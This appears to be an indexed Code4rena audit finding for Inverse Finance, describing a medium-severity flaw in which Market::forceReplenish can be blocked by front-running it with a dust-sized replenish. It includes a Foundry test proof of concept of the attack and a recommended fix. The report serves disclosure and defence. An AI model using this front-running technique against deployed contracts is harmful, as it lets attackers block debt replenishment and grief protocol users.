---
# Core Classification
protocol: Inverse Finance
chain: everychain
category: uncategorized
vulnerability_type: revert_by_sending_dust

# Attack Vector Details
attack_type: revert_by_sending_dust
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 5742
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2022-10-inverse-finance-contest
source_link: https://code4rena.com/reports/2022-10-inverse
github_link: https://github.com/code-423n4/2022-10-inverse-findings/issues/443

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.80
financial_impact: medium

# Scoring
quality_score: 4
rarity_score: 4

# Context Tags
tags:
  - revert_by_sending_dust

protocol_categories:
  - liquid_staking
  - cdp
  - services
  - synthetics

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - immeas
---

## Vulnerability Title

[M-13] Market::forceReplenish can be DoSed

### Overview


This bug report is about a vulnerability in the code of a smart contract that can be exploited by malicious parties to prevent a replenish from happening. The malicious party can front run the replenish action with a dust amount, preventing the replenish from happening. The proof of concept code provided in the report shows how this vulnerability can be exploited. The recommended mitigation step is to use the min(deficit,amount) function as the amount to replenish, which would prevent the malicious party from being able to front run the replenish action.

### Original Finding Content

## Lines of code

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562


## Vulnerability details

## Impact
If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.

## Proof of Concept
```javascript
    function testForceReplenishFrontRun() public {
        gibWeth(user, wethTestAmount);
        gibDBR(user, wethTestAmount / 14);
        uint initialReplenisherDola = DOLA.balanceOf(replenisher);

        vm.startPrank(user);
        deposit(wethTestAmount);
        uint borrowAmount = getMaxBorrowAmount(wethTestAmount);
        market.borrow(borrowAmount);
        uint initialUserDebt = market.debts(user);
        uint initialMarketDola = DOLA.balanceOf(address(market));
        vm.stopPrank();

        vm.warp(block.timestamp + 5 days);
        uint deficitBefore = dbr.deficitOf(user);
        vm.startPrank(replenisher);

        market.forceReplenish(user,1); // front run DoS

        vm.expectRevert("Amount > deficit");
        market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit
        
        assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");
        assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");
        assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),
            "DOLA balance of market did not decrease by amount paid to replenisher");
        assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");

        // debt only increased by dust
        assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");
    }
```
This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks. 

## Tools Used
vscode, forge

## Recommended Mitigation Steps
Use `min(deficit,amount)` as amount to replenish

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 4/5 |
| Rarity Score | 4/5 |
| Audit Firm | Code4rena |
| Protocol | Inverse Finance |
| Report Date | N/A |
| Finders | immeas |

### Source Links

- **Source**: https://code4rena.com/reports/2022-10-inverse
- **GitHub**: https://github.com/code-423n4/2022-10-inverse-findings/issues/443
- **Contest**: https://code4rena.com/contests/2022-10-inverse-finance-contest

### Keywords for Search

`Revert By Sending Dust`

